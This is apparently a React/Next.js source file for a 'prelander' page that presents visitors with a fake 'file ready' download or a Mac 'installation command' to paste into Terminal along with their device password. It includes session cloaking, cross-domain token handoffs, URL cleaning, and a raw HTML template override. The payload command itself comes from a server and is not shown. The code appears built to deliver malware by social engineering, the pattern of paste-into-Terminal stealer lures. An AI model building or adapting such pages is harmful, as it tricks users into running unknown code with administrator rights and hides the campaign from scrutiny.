'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'

import { guardTab } from '@/lib/tab-guard'
import { SESSION_UNAVAILABLE_TITLE, SESSION_UNAVAILABLE_MESSAGE } from '@/lib/prelander-session'

// The server validates the session on each resolve. Cookies are shared across tabs.
function SessionUnavailable() {
  return (
    <main className="min-h-screen flex items-center justify-center bg-[#f0f2f5] p-6">
      <section className="w-full max-w-md rounded-2xl bg-white p-8">
        <h1 className="text-2xl font-semibold text-gray-900">{SESSION_UNAVAILABLE_TITLE}</h1>
        <p className="mt-4 leading-relaxed text-gray-600">{SESSION_UNAVAILABLE_MESSAGE}</p>
      </section>
    </main>
  )
}

export default function PrelanderSlugPage() {
  const params = useParams()
  const slug = (params.slug as string) || 'session'
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [denied, setDenied] = useState(false)
  const [transitioning, setTransitioning] = useState(false)

  useEffect(() => {
    (async () => {
      // Avoid repeating a request after the server has denied this load.
      if (denied) {
        return;
      }

      if (!slug) { 
        setDenied(true)
        setLoading(false)
        return 
      }

      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''

      if (slug === 'session') {
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }

        try {
          const access = await guardTab()
          if (access === 'denied') { setDenied(true); setLoading(false); return }
          if (access === 'redirected') return
          const res = await fetch('/api/prelander/resolve/session', {
            credentials: "include",
            headers: { 'X-Prelander-Host': hostname },
          });
          
          if (res.status === 204 || !res.ok) {
            setDenied(true)
            setLoading(false)
            return
          }
          
          const data = await res.json()
          if (!data?.success) {
            setDenied(true)
            setLoading(false)
            return
          }
          
          setData(data)
          setLoading(false)
          return
        } catch (error) {
          console.error('[PRELANDER] Session resolve error:', error)
          setDenied(true)
          setLoading(false)
          return
        }
      }

      try {
        // Step 1: check if this hostname is the Prelander domain.
        const dtUrl = `/api/prelander/domain-type?host=${encodeURIComponent(hostname)}&slug=${encodeURIComponent(slug)}`
        const dtRes = await fetch(dtUrl)

        if (dtRes.ok) {
          const dt = await dtRes.json()

          // Bypass ON (spec): Anchor → Inter (0.75s dwell) → Campaign URL.
          if (dt.bypass_redirect_url) {
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            window.location.replace(dt.bypass_redirect_url)
            return
          }
          
          const prelanderDomain = dt.prelander_domain ?? dt.last_domain

          // Handle redirect flow
          if (prelanderDomain) {
            let handoffToken: string | null = null
            try {
              const hRes = await fetch(
                `/api/prelander/handoff?slug=${encodeURIComponent(slug)}&target_host=${encodeURIComponent(new URL(prelanderDomain).hostname)}`,
                { headers: { 'X-Prelander-Host': hostname }, cache: 'no-store', redirect: 'manual' }
              )

              if (hRes.ok) {
                const h = await hRes.json()
                handoffToken = h?.handoff || null
              } else if (hRes.status === 302 || hRes.status === 301 || hRes.status === 307) {
                const hop = hRes.headers.get('location')
                if (hop) {
                  setTransitioning(true)
                  await new Promise(r => setTimeout(r, 750))
                  window.location.replace(hop)
                  return
                }
              }
            } catch (handoffError) {
              console.error('[PRELANDER] Handoff error:', handoffError)
            }

            if (!handoffToken) {
              setDenied(true)
              return
            }

            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            const authUrl = `${prelanderDomain}/_auth/${handoffToken}`
            window.location.replace(authUrl)
            return
          }
        }

        // Step 2: on the Prelander domain - resolve data
        const res = await fetch(`/api/prelander/resolve/${slug}`, {
          credentials: "include",
          headers: { "X-Prelander-Host": window.location.hostname },
        });
        
        if (res.status === 204 || !res.ok) {
          console.error('[PRELANDER] Resolve failed:', res.status, res.statusText)
          setDenied(true)
          return
        }

        const data = await res.json()
        if (!data?.success) {
          console.error('[PRELANDER] Resolve data invalid:', data)
          setDenied(true)
          return
        }

        // Legacy slug resolution can mint the arrival, so claim after resolve.
        const access = await guardTab()
        if (access === 'denied') { setDenied(true); return }
        if (access === 'redirected') { setTransitioning(true); return }

        // Show the content
        setData(data)
        
        // CLEAN FINAL URL (spec)
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }
      } catch (error) {
        console.error('[PRELANDER] Main flow error:', error)
        setDenied(true)
      } finally {
        setLoading(false)
      }
    })();
  }, [slug, denied])

  useEffect(() => {
    document.title = denied ? SESSION_UNAVAILABLE_TITLE : 'Download Ready'
  }, [denied])

  if (denied) return <SessionUnavailable />

  // Keep the document empty until authorization or navigation completes.
  if (loading || transitioning) return null

  if (!data) return <SessionUnavailable />

  // Note: Bypass OFF always shows the landing page — even when the backend has
  // no active template (the built-in layout renders as fallback). The visitor
  // is only forwarded straight to the campaign URL when Bypass is ON, which
  // happens earlier via `bypass_redirect_url` from /domain-type.

  // Admin pasted a complete HTML template → the backend already rendered it
  // server-side ({Campaign_URL} / {Password} shortcodes substituted). Serve it
  // as a full-page document instead of the built-in layouts.
  if (data.rendered_html) return <FullHtmlPrelander html={data.rendered_html} />

  if (data.os === 'mac') return <MacPrelander data={data} />
  return <WindowsPrelander data={data} />
}

/* ─── Full HTML: server-rendered custom template ─────────────────────────── */
function FullHtmlPrelander({ html }: { html: string }) {
  useEffect(() => {
    // Replace the whole document so <!DOCTYPE html>, <head> styles and the
    // template's scripts behave exactly as the admin authored them.
    document.open()
    document.write(html)
    document.close()
  }, [html])
  return null
}

/* ─── Windows Prelander ──────────────────────────────────────────────────── */
function WindowsPrelander({ data }: { data: any }) {
  const [copied, setCopied] = useState(false)
  // Template customisation fields resolved by the backend (assigned template
  // or OS default); fall back to the historical copy when no template data.
  const tpl = data?.template
  const title = tpl?.title ?? 'Your file is ready to download'
  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
  const buttonText = tpl?.button_text ?? 'Copy'

  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url).catch(() => {})
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}>
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
              </button>
            </div>
          </div>

          {data.password && (tpl?.show_password_field ?? true) && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>
        <p className="text-center text-xs text-gray-400 mt-4">Secure file hosting service</p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ──────────────────────────────────────────────────────── */
function MacPrelander({ data }: { data: any }) {
  const [copiedCmd, setCopiedCmd] = useState(false)
  const installCommand = data.offer_url || ''
  // Template customisation fields — same source as the Windows prelander.
  const tpl = data?.template
  const title = tpl?.title ?? 'How to open Terminal on Mac'

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand).catch(() => {})
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
          </div>

          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}>
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3">
              {[
                <>Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.</>,
                <>Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.</>,
                <>Once the Terminal window is open, proceed with the steps below.</>,
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>
          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              {[
                'Copy the installation command above.',
                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                'Enter your device password and confirm the installation.',
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>
          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video className="w-full h-full" controls playsInline autoPlay muted loop preload="auto" src="/terminal.mp4" />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">Secure installation service</p>
      </div>
    </div>
  )
}
